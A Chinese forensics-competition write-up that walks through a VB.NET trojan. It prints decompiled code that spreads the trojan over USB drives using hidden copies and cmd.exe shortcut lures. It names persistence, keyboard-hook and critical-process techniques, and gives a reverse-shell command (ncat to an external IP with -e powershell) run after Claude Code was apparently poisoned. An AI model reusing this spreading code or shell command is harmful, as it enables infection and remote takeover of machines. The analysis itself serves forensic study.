ae cd 2c 6f 5b 77 e3 19 e5 35 56 4f 1f d6 01 d3

然后将这个哈希值复制进array的0 - 15位，15 - 30位（也就是说31位是0没变过）

array就是key

可以得知，key就是

ae cd 2c 6f 5b 77 e3 19 e5 35 56 4f 1f d6 01 ae cd 2c 6f 5b 77 e3 19 e5 35 56 4f 1f d6 01 d3 00

其解密模式是ECB

AES会根据key的长度自动设置其模式，比方说这里是32位key，就调用AES-256



然后，这里是先调用了base64解码，再调用的aes解码


<img src="/Picture/WpDF/Pinghang/2026Group/176.png" width="1023.5" title="" crop="0,0,1,1" id="ub6a61192" class="ne-image">



此时我们尝试解一下上一题的答案


<img src="/Picture/WpDF/Pinghang/2026Group/177.png" width="1181" title="" crop="0,0,1,1" id="uc68941c0" class="ne-image">

解出来证明逻辑确实正确

### 58 为了获取其加密算法的某个参数，木马使用一个硬编码字符串作为输入。这个硬编码字符串的值是多少？（答案格式：uwbf4=wNfw）
#### 答案
8xTJ0EKPuiQsJVaT

#### 过程
见上题

### 59 接上题，木马回连的ip地址有哪些？（按照木马中原始的顺序写入，答案用,隔开，格式：114.114.114.114,8.8.8.8,1.1.1.1）
#### 答案
156.238.239.253,66.175.239.149,185.117.249.43

#### 过程
都有解密方式了，不把所有加密字符都解一遍吗（）

欸然后就会发现，第一个字符串就是答案


<img src="/Picture/WpDF/Pinghang/2026Group/178.png" width="1106.5" title="" crop="0,0,1,1" id="ub5e00a41" class="ne-image">

愿意的话可以把后面的东西都解一下（）


<img src="/Picture/WpDF/Pinghang/2026Group/179.png" width="1016" title="" crop="0,0,1,1" id="u1bc5e828" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/180.png" width="823" title="" crop="0,0,1,1" id="u5a571c2a" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/181.png" width="923" title="" crop="0,0,1,1" id="udfcec5c6" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/182.png" width="890.5" title="" crop="0,0,1,1" id="u00cb2172" class="ne-image">

布什戈门你default还编码？？？

<img src="/Picture/WpDF/Pinghang/2026Group/183.png" width="826.5" title="" crop="0,0,1,1" id="u65885c12" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/184.png" width="905" title="" crop="0,0,1,1" id="u89f9026a" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/185.png" width="981.5" title="" crop="0,0,1,1" id="u28722d1c" class="ne-image">

这是啥？？

<img src="/Picture/WpDF/Pinghang/2026Group/186.png" width="1017.5" title="" crop="0,0,1,1" id="u12b5b7fe" class="ne-image">

这是个钱包地址吧

<img src="/Picture/WpDF/Pinghang/2026Group/187.png" width="895" title="" crop="0,0,1,1" id="u314aba2b" class="ne-image">

这玩意也是个钱包地址
你们怎么这么喜欢跟区块链挂钩
### 60 接上题，木马回连的C2通信端口是多少?【答案格式：11451】
#### 答案
7000

#### 过程
见上题顺带解出来的东西的第一个



但说句实话我没看到这玩意在哪里被调用了

### 61 接上题，该木马通过将自身复制到可移动设备上来传播。在每个受感染设备上创建的新副本的名称是什么?【答案格式： dwm.exe】
#### 答案
USB.exe

#### 过程
在有上一题的经验和59题全解出来的信息，以及这个十分标准的格式后，应该能猜出来答案的（吧）

### 62 接上题，木马用来检测其是否在沙盒环境中运行的DLL的名称是什么?【答案格式： v50.dll】
#### 答案
SbieDll.dll

#### 过程
见55题，第五个函数的意义

### 63 接上题，木马操纵的用于控制Windows资源管理器中隐藏项目可见性的注册表项名称是什么?【答案格式： AAAabc3】
#### 答案
#### 过程
继续看主函数


<img src="/Picture/WpDF/Pinghang/2026Group/188.png" width="1089" title="" crop="0,0,1,1" id="uc4515551" class="ne-image">

这里是将这个木马写入注册表的开机自启动里面去了

Conputer.Registry.CurrentUser获取注册表根目录

然后又导航到SubKey的Run下面去了，可以确定是用来设置开机就运行的

接下来


<img src="/Picture/WpDF/Pinghang/2026Group/189.png" width="1066" title="" crop="0,0,1,1" id="u00be9e16" class="ne-image">

这一块的try，AI告诉我说是用来在自启动文件夹里面创建快捷方式的

Environment.SpecialFolder.Startup会获取自启动的文件夹的路径

然后后面那个加上.ink后缀就表明这玩意是个快捷方式

继续看下面


<img src="/Picture/WpDF/Pinghang/2026Group/190.png" width="1132.5" title="" crop="0,0,1,1" id="u3ecc2052" class="ne-image">

这下面紧接着一个函数


<img src="/Picture/WpDF/Pinghang/2026Group/191.png" width="1110.5" title="" crop="0,0,1,1" id="u8a8a0a7b" class="ne-image">

这个函数很短，虽然变量名很长（所以dnSpy到底为什么要把一个变量名翻译的这么长？？要干嘛）

但是能很清晰的看到new Thread

这是一个启动新线程的函数，给这个VRt... 类里面的8JW8... 函数创建了一个线程

然后在后面start了这个线程

那去看这个8JW8... 函数是干啥的

private static void 8JW8sctAWP3goappjN57CJl2TLWyKcTw2ZYwj5rr18XOfs8ItKA8LpXmObthOBfOKEBBELi8RAE3J()
{
    int num2;
    int num4;
    object obj3;
    try
    {
        IL_00:
        int num = 1;
        object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(&quot;wscript.shell&quot;, &quot;&quot;));
        IL_18:
        checked
        {
            for (;;)
            {
                IL_74D:
                num = 3;
                if (!true)
                {
                    break;
                }
                IL_1D:
                ProjectData.ClearProjectError();
                num2 = 1;
                IL_25:
                num = 5;
                RegistryKey registryKey = MuC0Ek32S2qWYkJGK8MCDraE3NRaegV2ciWj85lpbnaytobXnqusBz1a9jJ9.Computer.Registry.CurrentUser.OpenSubKey(&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced&quot;, true);
                IL_43:
                num = 6;
                if (Operators.ConditionalCompareObjectEqual(registryKey.GetValue(&quot;ShowSuperHidden&quot;), 1, false))
                {
                    IL_5F:
                    num = 7;
                    registryKey.SetValue(&quot;ShowSuperHidden&quot;, 0);
                }
                IL_73:
                num = 9;
                DriveInfo[] drives = DriveInfo.GetDrives();
                int i = 0;
                while (i &lt; drives.Length)
                {
                    DriveInfo driveInfo = drives[i];
                    IL_8C:
                    num = 10;
                    if (driveInfo.IsReady)
                    {
                        IL_9B:
                        num = 11;
                        if (driveInfo.DriveType == DriveType.Removable)
                        {
                            IL_AB:
                            num = 12;
                            string name = driveInfo.Name;
                            IL_B6:
                            num = 13;
                            if (!File.Exists(name + NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.s6qNUlBh1I6DXfxJKXLS8vMqDb2zNIYNi5hhilJnX0Mbzr8B4g6F0vguJvMV))
                            {
                                IL_CC:
                                num = 14;
                                File.WriteAllBytes(name + NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.s6qNUlBh1I6DXfxJKXLS8vMqDb2zNIYNi5hhilJnX0Mbzr8B4g6F0vguJvMV, File.ReadAllBytes(ACX0qTJzEzq40qP5qFxb.8qqIc9C1rZ7T3TBLTgSV));
                                IL_EA:
                                num = 15;
                                File.SetAttributes(name + NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.s6qNUlBh1I6DXfxJKXLS8vMqDb2zNIYNi5hhilJnX0Mbzr8B4g6F0vguJvMV, FileAttributes.Hidden | FileAttributes.System);
                            }
                            IL_FF:
                            num = 17;
                            string[] files = Directory.GetFiles(name);
                            int j = 0;
                            while (j &lt; files.Length)
                            {
                                string text = files[j];
                                IL_11A:
                                num = 18;
                                if (Operators.CompareString(Path.GetExtension(text).ToLower(), &quot;.lnk&quot;, false) != 0 &amp; Operators.CompareString(text.ToLower(), name.ToLower() + NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.s6qNUlBh1I6DXfxJKXLS8vMqDb2zNIYNi5hhilJnX0Mbzr8B4g6F0vguJvMV.ToLower(), false) != 0)
                                {
                                    IL_169:
                                    num = 19;
                                    File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
                                    IL_175:
                                    num = 20;
                                    object instance = NewLateBinding.LateGet(objectValue, null, &quot;CreateShortcut&quot;, new object[]
                                                                                     {
                                                                                         name + new FileInfo(text).Name + &quot;.lnk&quot;
                                                                                         }, null, null, null);
                                    IL_1AF:
                                    num = 21;
                                    NewLateBinding.LateSetComplex(instance, null, &quot;windowstyle&quot;, new object[]
											{
												7
											}, null, null, false, true);
											IL_1D8:
											num = 22;
											NewLateBinding.LateSetComplex(instance, null, &quot;TargetPath&quot;, new object[]
											{
												&quot;cmd.exe&quot;
											}, null, null, false, true);
											IL_200:
											num = 23;
											NewLateBinding.LateSetComplex(instance, null, &quot;WorkingDirectory&quot;, new object[]
											{
												&quot;&quot;
											}, null, null, false, true);
											IL_228:
											num = 24;
											NewLateBinding.LateSetComplex(instance, null, &quot;Arguments&quot;, new object[]
											{
												string.Concat(new string[]
												{
													&quot;/c start &quot;,
													NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.s6qNUlBh1I6DXfxJKXLS8vMqDb2zNIYNi5hhilJnX0Mbzr8B4g6F0vguJvMV.Replace(&quot; &quot;, &quot;\&quot; \&quot;&quot;),
													&quot;&amp;start &quot;,
													new FileInfo(text).Name.Replace(&quot; &quot;, &quot;\&quot; \&quot;&quot;),
													&quot; &amp; exit&quot;
												})
											}, null, null, false, true);
											IL_2AC:
											num = 25;
											object obj = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, &quot;regread&quot;, new object[]
											{
												Operators.ConcatenateObject(Operators.ConcatenateObject(&quot;HKEY_LOCAL_MACHINE\\software\\classes\\&quot;, NewLateBinding.LateGet(objectValue, null, &quot;regread&quot;, new object[]
												{
													&quot;HKEY_LOCAL_MACHINE\\software\\classes\\.&quot; + Strings.Split(Path.GetFileName(text), &quot;.&quot;, -1, CompareMethod.Binary)[Information.UBound(Strings.Split(Path.GetFileName(text), &quot;.&quot;, -1, CompareMethod.Binary), 1)] + &quot;\\&quot;
												}, null, null, null)), &quot;\\defaulticon\\&quot;)
											}, null, null, null));
											IL_341:
											num = 26;
											object right = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, null, &quot;CreateShortcut&quot;, new object[]
											{
												name + new FileInfo(text).Name + &quot;.lnk&quot;
											}, null, null, null), null, &quot;IconLocation&quot;, new object[0], null, null, null));
											IL_394:
											num = 27;
											if (Strings.InStr(Conversions.ToString(obj), &quot;,&quot;, CompareMethod.Binary) == 0)
											{
												IL_3AD:
												num = 28;
												NewLateBinding.LateSetComplex(instance, null, &quot;iconlocation&quot;, new object[]
												{
													text
												}, null, null, false, true);
												IL_3D2:;
											}
											else
											{
												IL_3D4:
												num = 30;
												IL_3D8:
												num = 31;
												NewLateBinding.LateSetComplex(instance, null, &quot;iconlocation&quot;, new object[]
												{
													RuntimeHelpers.GetObjectValue(obj)
												}, null, null, false, true);
											}
											IL_402:
											num = 33;
											if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(instance, null, &quot;iconlocation&quot;, new object[0], null, null, null), right, false))))
											{
												IL_430:
												num = 34;
												NewLateBinding.LateCall(instance, null, &quot;Save&quot;, new object[0], null, null, null, true);
											}
											IL_44C:
											num = 36;
											right = null;
											IL_453:
											num = 37;
											obj = null;
											IL_45A:
											instance = null;
										}
										IL_45D:
										j++;
										IL_463:
										num = 40;
									}
									IL_472:
									num = 41;
									string[] directories = Directory.GetDirectories(name);
									int k = 0;
									while (k &lt; directories.Length)
									{
										string text2 = directories[k];
										IL_48D:
										num = 42;
										File.SetAttributes(text2, FileAttributes.Hidden | FileAttributes.System);
										IL_499:
										num = 43;
										object instance2 = NewLateBinding.LateGet(objectValue, null, &quot;CreateShortcut&quot;, new object[]
										{
											name + Path.GetFileNameWithoutExtension(text2) + &quot; .lnk&quot;
										}, null, null, null);
										IL_4CE:
										num = 44;
										NewLateBinding.LateSetComplex(instance2, null, &quot;windowstyle&quot;, new object[]
										{
											7
										}, null, null, false, true);
										IL_4F7:
										num = 45;
										NewLateBinding.LateSetComplex(instance2, null, &quot;TargetPath&quot;, new object[]
										{
											&quot;cmd.exe&quot;
										}, null, null, false, true);
										IL_51F:
										num = 46;
										NewLateBinding.LateSetComplex(instance2, null, &quot;WorkingDirectory&quot;, new object[]
										{
											&quot;&quot;
										}, null, null, false, true);
										IL_547:
										num = 47;
										NewLateBinding.LateSetComplex(instance2, null, &quot;arguments&quot;, new object[]
										{
											string.Concat(new string[]
											{
												&quot;/c start &quot;,
												Strings.Replace(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.s6qNUlBh1I6DXfxJKXLS8vMqDb2zNIYNi5hhilJnX0Mbzr8B4g6F0vguJvMV, &quot; &quot;, &quot;\&quot; \&quot;&quot;, 1, -1, CompareMethod.Binary),
												&quot;&amp;start explorer &quot;,
												Strings.Replace(new DirectoryInfo(text2).Name, &quot; &quot;, &quot;\&quot; \&quot;&quot;, 1, -1, CompareMethod.Binary),
												&quot;&amp;exit&quot;
											})
										}, null, null, false, true);
										IL_5D1:
										num = 48;
										object obj2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, &quot;regread&quot;, new object[]
										{
											&quot;HKEY_LOCAL_MACHINE\\software\\classes\\folder\\defaulticon\\&quot;
										}, null, null, null));
										IL_5FE:
										num = 49;
										object right2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, null, &quot;CreateShortcut&quot;, new object[]
										{
											name + Path.GetFileNameWithoutExtension(text2) + &quot; .lnk&quot;
										}, null, null, null), null, &quot;IconLocation&quot;, new object[0], null, null, null));
										IL_64C:
										num = 50;
										if (Strings.InStr(Conversions.ToString(obj2), &quot;,&quot;, CompareMethod.Binary) == 0)
										{
											IL_665:
											num = 51;
											NewLateBinding.LateSetComplex(instance2, null, &quot;IconLocation&quot;, new object[]
											{
												text2
											}, null, null, false, true);
											IL_68A:;
										}
										else
										{
											IL_68C:
											num = 53;
											IL_690:
											num = 54;
											NewLateBinding.LateSetComplex(instance2, null, &quot;IconLocation&quot;, new object[]
											{
												RuntimeHelpers.GetObjectValue(obj2)
											}, null, null, false, true);
										}
										IL_6BA:
										num = 56;
										if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(instance2, null, &quot;iconlocation&quot;, new object[0], null, null, null), right2, false))))
										{
											IL_6E8:
											num = 57;
											NewLateBinding.LateCall(instance2, null, &quot;Save&quot;, new object[0], null, null, null, true);
										}
										IL_704:
										num = 59;
										right2 = null;
										IL_70B:
										num = 60;
										obj2 = null;
										IL_712:
										instance2 = null;
										k++;
										IL_71B:
										num = 62;
									}
								}
							}
							IL_72A:
							i++;
							IL_730:
							num = 65;
						}
						IL_73F:
						num = 66;
						Thread.Sleep(5000);
					}
					IL_756:
					goto IL_8C3;
					IL_75F:;
				}
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_87F:
				goto IL_8B8;
				IL_881:
				num4 = num;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num2);
				IL_894:;
			}
			catch when (endfilter(obj3 is Exception &amp; num2 != 0 &amp; num4 == 0))
			{
				Exception ex = (Exception)obj4;
				goto IL_881;
			}
			IL_8B8:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_8C3:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}
一点点来看


<img src="/Picture/WpDF/Pinghang/2026Group/192.png" width="940" title="" crop="0,0,1,1" id="uc1fffb59" class="ne-image">

定义了几个变量，创建了wscript的实例


<img src="/Picture/WpDF/Pinghang/2026Group/193.png" width="1282.5" title="" crop="0,0,1,1" id="ufe31f804" class="ne-image">

清理了所有的错误状态（ProjectData.ClearProjectError();是VB.NET里面用来清理错误状态的，这证明这个项目应该是用VB.NET来写的而非C#）后

打开了注册表子项（RegistryKey）并标记为可写入（bool值为true）

然后检测ShowSuperHidden这一项的值是否是0（即不显示系统文件），如果是则设置为1

此时已可以确认，这里操控的注册表项名称就是ShowSuperHidden

### 64 接上题，木马使用哪个API将其进程标记为关键进程?【答案格式： WNetAddConnection】
#### 答案
RtlSetProcessIsCritical

#### 过程
继续看主函数


<img src="/Picture/WpDF/Pinghang/2026Group/194.png" width="1099" title="" crop="0,0,1,1" id="u9e6d4be5" class="ne-image">

前一题是去oXAU... 里面找信息了，接下来一个一个函数看


<img src="/Picture/WpDF/Pinghang/2026Group/195.png" width="1002.5" title="" crop="0,0,1,1" id="uefdf3b50" class="ne-image">

这玩意就用来防止休眠的


<img src="/Picture/WpDF/Pinghang/2026Group/196.png" width="1079.5" title="" crop="0,0,1,1" id="u228a6dee" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/197.png" width="1042" title="" crop="0,0,1,1" id="uc56ebea2" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/198.png" width="1070.5" title="" crop="0,0,1,1" id="u6a4a4c42" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/199.png" width="1009" title="" crop="0,0,1,1" id="u5abcfe79" class="ne-image">

通过一次一次的调用可以看到，这一堆函数的目的是用来创建windows钩子（Hook）的（最后一张图片，EntryPoint = "SetWindowsHookEx"）

windows钩子的目的是用来监控输入的，当安装成功后，在接收到相应的输入后（比方说安装了键盘输入器），系统会优先调用设置的回调函数，在回调函数中可以对输入进行更改、查看、阻止事件发生等等

显然没有信息

看看下一个函数


<img src="/Picture/WpDF/Pinghang/2026Group/200.png" width="1080.5" title="" crop="0,0,1,1" id="u6a758aa0" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/201.png" width="1085" title="" crop="0,0,1,1" id="u41634304" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/202.png" width="689.5" title="" crop="0,0,1,1" id="u3ba75471" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/203.png" width="978.5" title="" crop="0,0,1,1" id="u97cdd425" class="ne-image">

根据AI的说法，这玩意是监控剪切板的，没有啥API关键进程

下一个


<img src="/Picture/WpDF/Pinghang/2026Group/204.png" width="1043.5" title="" crop="0,0,1,1" id="u9d25242f" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/205.png" width="740" title="" crop="0,0,1,1" id="ucce997ac" class="ne-image">

先判断了一下是否是管理员权限，如果是进if判断

if判断里面的函数大致作用为

先订阅事件（SystemEvents，用法和Unity里面那玩意差不多，通过+=订阅），订阅了系统会话结束的事件后执行函数re0A... 

Process.EnterDebugMode();

使系统进入调试模式

然后就是函数H8da... 


<img src="/Picture/WpDF/Pinghang/2026Group/206.png" width="1043.5" title="" crop="0,0,1,1" id="u36626ab1" class="ne-image">

H8da函数相当于是直接导入了RtlSetProcessIsCritical这个函数，对于这个函数，第一个bool值就是设置关键进程，true设置false取消，第二个bool用来表明是否成功设置，传出，第三个不知道干什么的（）

那么这里就找到了

### 65 接上题，木马使用哪个API来捕获用户输入?【答案格式： WNetAddConnection】
#### 答案
SetWindowsHookEx

#### 过程
见上题对钩子的分析

通过钩子捕获用户的输入

## 内存
### 66 请分析倩倩的PC镜像，倩倩的电脑曾被api投毒过，请找出投毒后执行的的恶意命令。【答案格式： cmd.exe 172.0.0.122 -i hel1o】
#### 答案
ncat.exe 156.238.239.253 1314 -e powershell

#### 过程
小故事很重要，有时能提供很有用的信息


<img src="/Picture/WpDF/Pinghang/2026Group/207.png" width="692" title="" crop="0,0,1,1" id="u866852b6" class="ne-image">

如图，这是个api投毒，往ClaudeCode里面投毒了木马病毒  
那理论上应该去Claude应用里面去找

然而


<img src="/Picture/WpDF/Pinghang/2026Group/208.png" width="1014.5" title="" crop="0,0,1,1" id="u9857b475" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/209.png" width="1150" title="" crop="0,0,1,1" id="ua7af8b9b" class="ne-image">

不论是program file 还是x86里面，都没有相关文件

那猜测很可能是在appdata里面

然而


<img src="/Picture/WpDF/Pinghang/2026Group/210.png" width="1267" title="" crop="0,0,1,1" id="u7c80d9e6" class="ne-image">

在找AppData前，在appdata上面看到了另一个文件夹.claude

去这里面找找


<img src="/Picture/WpDF/Pinghang/2026Group/211.png" width="1146.5" title="" crop="0,0,1,1" id="u3678252b" class="ne-image">

要查

看了history会发现长得像（并非像）对话记录（事实上claudecode就是个AI）

然后（我问了AI，AI说按照session、plugins、project的顺序找）先去看plugins（sessions是空的）

会发现plugins里面只有一堆临时文件

去看project


<img src="/Picture/WpDF/Pinghang/2026Group/212.png" width="685.5" title="" crop="0,0,1,1" id="u24ebf184" class="ne-image">

一堆文件，一个一个看看

然后在第11个文件里面


<img src="/Picture/WpDF/Pinghang/2026Group/213.png" width="1421.5" title="" crop="0,0,1,1" id="u16941047" class="ne-image">

（搜索文件还是AI靠谱（））

（这搁考试里面也绝对是我找不到的（））

### 67 请分析倩倩的PC内存镜像，识别当前正在运行且持有微信数据库解密密钥的微信进程，并提取该进程的进程标识符(PID)?【答案格式：1234】
#### 答案
10892

#### 过程
内存挂载到火眼上看微信密钥

里面只有一个进程标识符还能是哪个（）


<img src="/Picture/WpDF/Pinghang/2026Group/214.png" width="1333" title="" crop="0,0,1,1" id="uaeccea7d" class="ne-image">

### 68 请分析倩倩的PC内存镜像，请尝试解密微信数据库并写出message_0.db对应的微信密钥?【答案格式： 60e248c9079f4bc14e256e0b65495e8688d7b342d43dc84a5f417f4097c9c792】
#### 答案
 b0fb4730d908c07d3e928b5c418a7470bd954d100c9607821e0c05051c4588aa 

#### 过程
冷知识，火眼这次比答案更超模


<img src="/Picture/WpDF/Pinghang/2026Group/215.png" width="1118.5" title="" crop="0,0,1,1" id="u5622cc79" class="ne-image">

后面b59f89...都不需要

### 69 请分析B的PC内存镜像，请找到正在运行的木马进程的进程标识符（PID）。（答案格式：1233）
#### 答案
7348

#### 过程
已经知道木马是哪个程序了


<img src="/Picture/WpDF/Pinghang/2026Group/216.png" width="1315" title="" crop="0,0,1,1" id="uba77c21f" class="ne-image">

### 70 请分析B的PC内存镜像，请找到正在运行的木马进程的创建时间（UTC）?（答案格式：2026-01-01 01:11:11）
#### 答案
2026-04-03 01:46:44

#### 过程
时间是UTC，不是UTC+8

剩下的见上题图片

### 71 请分析倩倩的PC内存镜像，结合木马分析找出内存中回连的C2木马服务器的真实ip?【答案格式：127.0.0.1:8080】
#### 答案
#### 过程
用lovelymem搜出来的


<img src="/Picture/WpDF/Pinghang/2026Group/217.png" width="1182.5" title="" crop="0,0,1,1" id="u0e0f91e5" class="ne-image">

这里面能看到俩IP

此时结合59题和60题即可得出答案



提醒一下，lovelymem不能读取中文路径，不能读取非空路径

lovelymem所有提示的文件缺失都是去对应位置找文件是否存在的

可以通过改yaml文件里面的路径来实现

对于doken缺失可以通过ProcessMonitor过滤得到

由于这玩意是通过python运行的，只要把python过滤出来即可

然后就能看到，这玩意对doken的检测方式是检测在program file下面有没有doken

